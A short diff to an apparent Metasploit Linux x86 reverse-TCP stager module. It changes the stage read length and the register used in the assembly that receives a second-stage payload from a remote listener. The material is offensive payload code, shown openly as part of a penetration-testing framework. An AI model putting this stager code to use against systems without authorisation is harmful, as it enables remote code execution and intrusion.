@@ -93,8 +93,10 @@ module Payload::Linux::ReverseTcp_x86
       pay_mod = framework.payloads.create(self.refname)
       read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
     else
-      read_length = 4096
+      read_length = 2048
     end
+
+    read_reg = read_length.to_s(16).size > 4 ? 'edx' : 'dx'
 
     asm = %Q^
         push #{retry_count}        ; retry counter
@@ -163,7 +165,7 @@ module Payload::Linux::ReverseTcp_x86
         mov ecx, esp
         cdq
         mov dh, 0xc
-        push   0x#{read_length.to_s(16)}
+        mov #{read_reg},  0x#{read_length.to_s(16)}
         mov al, 0x3
         int 0x80                  ; sys_read (recv())
         test eax, eax
